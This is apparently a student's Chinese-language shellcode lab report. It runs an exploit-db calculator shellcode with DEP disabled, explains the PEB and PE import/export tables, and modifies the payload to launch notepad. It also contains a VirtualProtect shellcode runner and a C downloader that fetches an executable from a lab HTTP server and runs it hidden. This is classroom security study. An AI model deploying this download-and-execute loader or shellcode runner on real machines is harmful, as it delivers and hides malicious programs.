## shellcode实验



### **实验要求**

- [x] 把[链接](https://www.exploit-db.com/shellcodes/48116)中shellcode能够成功运行
- [x] 能从汇编源码编译通过并成功dump
- [x]  自行查阅资料，搜索Windows PEB结构体，PE文件导入表导出表相关数据结构的文档，解读shellcode原理
- [x] 修改shellcode功能为运行记事本程序notepad. exe
- [x] (选做，难度较大)修改shellcode功能为下载执行器，即下下载一个可执行文件，然后再运行（提示，使用原生API UrlDownloadToFileA）


### **实验过程**

**1. 把[链接](https://www.exploit-db.com/shellcodes/48116)中shellcode能够成功运行**

- 关闭数据执行保护

	![](./img/关闭数据执行保护.PNG)

- 源文件要保存为.c文件

- 复制执行代码即可成功运行

	![](./img/calc.gif)


**2. 能从汇编源码编译通过并成功dump**

- 将代码复制粘贴到kali中并存成win32-WinExec_Calc-Exit.asm文件

	```
	nasm -f win32 win32-WinExec_Calc-Exit.asm -o win32-WinExec_Calc-Exit.o
	```

- 将.asm文件编译成.o文件

	```
	for i in $(objdump -D win32-WinExec_Calc-Exit.o | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo
	```
执行结果如下

![](./img/calc编译通过.PNG)

**3. 自行查阅资料，搜索Windows PEB结构体，PE文件导入表导出表相关数据结构的文档，解读shellcode原理**

**①PEB结构体**

作用：可以找到api函数的地址

```
typedef struct _PEB {
  BYTE                          Reserved1[2];
  BYTE                          BeingDebugged;	//指示当前是否正在调试指定的进程
  BYTE                          Reserved2[1];
  PVOID                         Reserved3[2];
  PPEB_LDR_DATA                 Ldr;			//指向PEB_LDR_DATA结构的指针
  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
  PVOID                         Reserved4[3];
  PVOID                         AtlThunkSListPtr;
  PVOID                         Reserved5;
  ULONG                         Reserved6;
  PVOID                         Reserved7;
  ULONG                         Reserved8;
  ULONG                         AtlThunkSListPtr32;
  PVOID                         Reserved9[45];
  BYTE                          Reserved10[96];
  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
  BYTE                          Reserved11[128];
  PVOID                         Reserved12[1];
  ULONG                         SessionId;	//与当前进程相关的会话标识符
} PEB, *PPEB;
```

**②PEB_LDR_DATA结构**

作用：包含有关进程的已加载模块的信息

```
typedef struct _PEB_LDR_DATA {
  BYTE       Reserved1[8];
  PVOID      Reserved2[3];
  LIST_ENTRY InMemoryOrderModuleList;//双向链表头结点，链表中都是指向LDR_DATA_TABLE_ENTRY结构的指针
} PEB_LDR_DATA, *PPEB_LDR_DATA;
```

**Ps：**

1.此处的模块即dll文件

2.`LDR_DATA_TABLE_ENTRY`结构中定义的`PVOID DllBase`是模块被读入内存后的位置，` UNICODE_STRING FullDllName`是dll的名字

**③PE文件结构**


![](./img/PE文件格式.jpg)

导出表：描述模块中的导出函数的结构，即描述一个dll中有哪些api以及他们的位置。

如果一个模块导出了函数，那么这个函数会被记录在导出表中，通过GetProcAddress函数可以动态获取到函数的地址。函数导出的方式有两种：按名字或序号导出

```
typedef struct _IMAGE_EXPORT_DIRECTORY {
    DWORD   Characteristics;
    DWORD   TimeDateStamp;
    WORD    MajorVersion;
    WORD    MinorVersion;
    DWORD   Name;				//导出模块的名字
    DWORD   Base;				//函数的起始基址
    DWORD   NumberOfFunctions;		//导出函数的数目
    DWORD   NumberOfNames;			//导出函数名字的数目
    DWORD   AddressOfFunctions;     //导出函数地址表的首地址
    DWORD   AddressOfNames;         //导出函数名表的首地址
    DWORD   AddressOfNameOrdinals;  //导出函数序号表的首地址
} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;
```

导入表：描述一个dll中需要调用哪些api

```
typedef struct _IMAGE_IMPORT_DESCRIPTOR {
    union {
        DWORD   Characteristics;            
        DWORD   OriginalFirstThunk;         
    } DUMMYUNIONNAME;
    DWORD   TimeDateStamp;                  //导入模块的时间戳
 
    DWORD   ForwarderChain;                 
    DWORD   Name;							//导入模块的名字
    DWORD   FirstThunk;                    
} IMAGE_IMPORT_DESCRIPTOR;
typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;
```

**④shellcode原理**

被攻击对象没有动态链接的过程，也就是说如果shellcode想要call WinExec，就要自己进行api的动态链接（找到需要调用的api函数的地址）

寻找api地址的两种方法：

1.通过`GetProcAddress`函数得到api地址

2.用`CreateProcess`/`WinExec`遍历导出表

**4. 修改shellcode功能为运行记事本程序notepad. exe**

首先修改汇编源码,修改处只在`push`的地方

![](./img/修改notepad.PNG)


使用vimdiff工具观察两个.asm文件的不同

![](./img/使用vimdiff查看不同.PNG)

从汇编源码编译通过并成功dump

![](./img/notepad编译通过.PNG)


执行main函数即可
```
int main(int argc, char** argv)
{
	int (*func)();
	DWORD old_protect;
	VirtualProtect(code, sizeof(code), PAGE_EXECUTE_READWRITE, &old_protect);
	func = (int(*)()) code;
	(int)(*func)();
}
```

结果如图

![](./img/notepad.gif)



**5. (选做，难度较大)修改shellcode功能为下载执行器，即下下载一个可执行文件，然后再运行（提示，使用原生API UrlDownloadToFileA）**

作业要求使用原生api：`URLDownloadToFileA`，函数在 `Urlmon.dll` 这个dll中，这个dll不是默认加载的，所以还需要调用`LoadLibraryA`函数才能获得`urlmon.dll`的入口地址。而`LoadLibraryA`函数在`kernel32.dll`中，`kernel32.dll`是win32的基础动态链接库。


代码
```
#include<Windows.h>
#include<urlmon.h>

typedef int(WINAPI* MY_DOWNLOAD_PROC)(LPUNKNOWN, LPCSTR, LPCSTR, DWORD, LPBINDSTATUSCALLBACK);

int main() {
	//可以加载dll，根据函数名获得函数地址


	HMODULE hurlomd = LoadLibraryA("urlmon.dll");

	//GetProcAddress之前要想获得函数要遍历导出表
	//void* function_ptr = GetProcAddress(hurlomd, "URLDownloadToFileA");//urlmon.dll不会出现在导入表里，但是可以调用
	MY_DOWNLOAD_PROC function_ptr = (MY_DOWNLOAD_PROC)GetProcAddress(hurlomd, "URLDownloadToFileA");

	function_ptr(NULL, "http://10.195.24.35:8000/notepad.exe", "a.exe", 0, NULL);
	WinExec("a.exe", SW_HIDE);

}
```

在本地开启http server服务

![](./img/开启httpserver.PNG)

切换到Debug目录下后，点击即下载notepad.exe(功能：自动弹出记事本)

![](./img/点击即下载.PNG)

且运行上述代码后，会自动生成一个a.exe

![](./img/生成a.exe.PNG)

执行结果如下

![](./img/下载执行器.gif)

### **遇到的问题和解决方法**

1. [链接](https://www.exploit-db.com/shellcodes/48116)中shellcode程序无法正常运行，提示` error C2440: “类型强制转换”: 无法从“char [201]”转换为“int (__cdecl *)(void)”`
	- 解决：更改为.c文件即可

2. 对代码没有任何改动，但是notepad无法弹出
	- 解决：重新建立空项目与源文件就好了...不知道是怎么回事(请老师解惑QAQ)

### **参考资料**

[PEB官方文档](https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb)

[PE官方文档](https://docs.microsoft.com/en-us/windows/win32/debug/pe-format)

[PE文件结构详解](https://blog.csdn.net/adam001521/article/details/84658708)




